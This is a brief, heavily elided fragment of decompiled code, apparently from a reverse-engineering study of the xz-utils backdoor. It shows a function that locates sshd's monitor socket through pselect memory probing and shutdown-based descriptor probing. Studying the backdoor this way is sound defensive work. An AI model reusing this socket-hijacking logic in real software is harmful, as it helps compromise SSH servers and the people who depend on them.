// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_monitor_comm_fd.c
// Function: sshd_get_monitor_comm_fd @ 0x107C60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_monitor_comm_fd(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)
...

{
  ...
  if (ctx->monitor_struct_slot != (monitor **)0x0) {
    ...
    monitor_mapped = is_range_mapped_via_pselect((u8 *)monitor_candidate,4,ctx);
...
LAB_00107d34:
  ...
  monitor_mapped = sshd_find_socket_fd_by_shutdown_probe(pSocket,socket_index,libc_imports);
